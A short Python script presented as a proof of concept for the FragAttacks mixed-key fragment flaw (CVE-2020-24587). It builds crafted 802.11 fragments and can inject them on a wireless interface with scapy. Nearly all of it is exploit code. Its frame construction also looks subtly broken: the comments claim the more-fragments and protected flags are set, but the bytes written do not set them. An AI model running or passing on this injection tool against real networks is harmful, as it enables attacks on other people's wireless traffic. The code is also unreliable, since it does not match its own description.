#!/usr/bin/env python3
"""CVE-2020-24587 — FragAttacks: mixed-key fragment reassembly. Frames
encrypted under different keys get reassembled together. Zero-click.
Public (Vanhoef). HIGH."""
import struct, sys
from pathlib import Path

def _radiotap():
    return bytes.fromhex("00000a000000000000000000")

def build(dst="ffffffffffff", src="001122334455", bssid="66778899aabb") -> bytes:
    fc = bytes.fromhex("0801")
    seqctl = struct.pack("<H", (0 << 4) | 0x04)     # MF set
    hdr = _radiotap() + fc + b"\x00\x00" + bytes.fromhex(dst) + \
          bytes.fromhex(src) + bytes.fromhex(bssid) + seqctl
    # protected flag set -> encrypted fragment; key index in the IV differs
    f0 = hdr + b"\x00" + b"A" * 12                   # key 0
    seqctl2 = struct.pack("<H", (1 << 4) | 0x00)
    hdr2 = _radiotap() + fc + b"\x00\x00" + bytes.fromhex(dst) + \
           bytes.fromhex(src) + bytes.fromhex(bssid) + seqctl2
    f1 = hdr2 + b"\x01" + b"B" * 12                  # key 1 (mixed)
    return f0 + f1

def inject(iface, frame=None):
    try:
        from scapy.all import sendp, Raw
        sendp(Raw(frame or build()), iface=iface, verbose=False)
        print(f"[+] CVE-2020-24587 mixed-key fragments injected on {iface}"); return True
    except Exception as e:
        print(f"[-] {e}"); return False

def main():
    if len(sys.argv) > 2: inject(sys.argv[1])
    else:
        out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-24587.frame")
        d = build(); out.write_bytes(d)
        print(f"[+] CVE-2020-24587 mixed-key -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
